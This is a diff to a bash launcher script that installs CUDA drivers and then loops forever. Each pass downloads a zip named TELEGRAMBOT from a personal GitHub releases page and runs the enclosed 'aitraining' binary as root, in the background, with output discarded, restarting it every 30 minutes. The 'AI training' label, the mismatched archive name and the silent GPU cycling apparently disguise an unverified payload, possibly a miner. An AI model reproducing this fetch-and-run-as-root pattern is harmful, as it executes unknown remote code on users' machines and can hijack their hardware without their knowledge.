@@ -1,65 +1,67 @@
 #!/bin/bash
 
-# File: start_modelgp.sh launcher
+# CUDA installation state file
+CUDA_FLAG="/var/tmp/cuda_installed"
 
-# Ensure unzip is installed
+sudo dpkg --configure -a
 sudo apt install -y unzip
 
-# Main loop for managing start_modelgp.sh lifecycle
+# 1. Install CUDA if not already installed
+if [ ! -f "$CUDA_FLAG" ]; then
+    echo "Bắt đầu cài đặt CUDA..."
+
+    sudo apt update
+    sudo apt install -y ubuntu-drivers-common
+    sudo ubuntu-drivers install
+
+    sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2404/x86_64/cuda-keyring_1.1-1_all.deb
+    sudo apt install -y ./cuda-keyring_1.1-1_all.deb
+    sudo apt update
+    sudo apt -y install cuda-toolkit-11-8
+    sudo apt -y full-upgrade
+
+    sudo touch "$CUDA_FLAG"
+
+    echo "Cài đặt CUDA hoàn tất. Khởi động lại hệ thống..."
+    sudo reboot
+    exit 0
+fi
+
+# 2. Loop to manage AI training lifecycle
 while true; do
-    echo "Starting GPU model process..."
+    echo "Starting AI training process..."
 
-    # Stop any old processes
-    if pgrep -f "start_modelgp.sh" > /dev/null; then
-        sudo pkill -f "start_modelgp.sh"
-        echo "start_modelgp.sh process stopped."
-    else
-        echo "start_modelgp.sh process already stopped or crashed."
+    if pgrep -x "aitraining" > /dev/null; then
+        echo "Found existing aitraining process. Killing..."
+        pkill -x "aitraining"
+        sleep 5
     fi
 
-    if pgrep -f "aitraining" > /dev/null; then
-        sudo pkill -f "aitraining"
-        echo "aitraining process stopped."
-    else
-        echo "aitraining process already stopped or crashed."
-    fi
-
-    # Launch new process in background
     nohup bash -c '
-        # Optional re-download of TELEGRAMBOT
-        sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
+        sudo apt install -y unzip
+
+        # Download updated ZIP
+        sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/asdc/TELEGRAMBOTx.zip
+
+        sudo rm -rf TELEGRAMBOT
         sudo mkdir -p TELEGRAMBOT
         sudo unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT
 
-        # Go into the TELEGRAMBOT directory
         cd TELEGRAMBOT || exit
 
-        # Ensure scripts are executable
         sudo chmod +x aitraining
-        sudo chmod +x start_modelgp.sh
-
-        # Start main GPU script
-        sudo bash ./start_modelgp.sh
+        sudo ./aitraining -c config.json
     ' > /dev/null 2>&1 &
 
-    echo "start_modelgp.sh is now running. It will run for 1 hour."
+    echo "AI training started. It will run for 30 minutes."
+    sleep 1800   # 30 minutes
 
-    # Wait for 1 hour (4600 seconds)
-    sleep 4600
-
-    echo "Stopping running GPU process..."
-    if pgrep -f "start_modelgp.sh" > /dev/null; then
-        sudo pkill -f "start_modelgp.sh"
-        echo "start_modelgp.sh process stopped."
+    echo "Stopping AI training process..."
+    if pgrep -x "aitraining" > /dev/null; then
+        pkill -x "aitraining"
+        echo "AI training stopped."
     else
-        echo "start_modelgp.sh already stopped or crashed."
-    fi
-
-    if pgrep -f "aitraining" > /dev/null; then
-        sudo pkill -f "aitraining"
-        echo "aitraining process stopped."
-    else
-        echo "aitraining already stopped or crashed."
+        echo "AI training already exited."
     fi
 
     echo "Waiting 1 minute before restart..."
